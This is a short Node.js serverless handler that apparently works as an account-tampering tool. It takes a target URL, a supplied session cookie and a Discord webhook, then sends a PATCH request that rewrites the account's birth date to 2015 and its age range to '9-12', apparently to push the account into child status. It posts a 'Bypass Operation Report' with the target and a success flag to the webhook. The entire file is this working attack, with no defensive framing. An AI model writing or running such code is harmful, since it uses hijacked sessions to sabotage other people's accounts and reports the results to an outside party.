const fetch = require('node-fetch');

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: "Method not allowed" });
  const { targetUrl, cookie, discordWebhookUrl } = req.body;
  try {
    const response = await fetch(targetUrl, {
      method: 'PATCH',
      headers: { 'Cookie': cookie, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0' },
      body: JSON.stringify({ birth_date: "2015-01-01", age_range: "9-12", birthYear: 2015 })
    });
    const isSuccess = response.ok;
    await fetch(discordWebhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{ title: "Bypass Operation Report", description: `Target: ${targetUrl}\nStatus: ${isSuccess ? "SUCCESS" : "FAILURE"}`, color: isSuccess ? 65280 : 16711680 }]
      })
    });
    res.status(200).json({ success: isSuccess });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
}
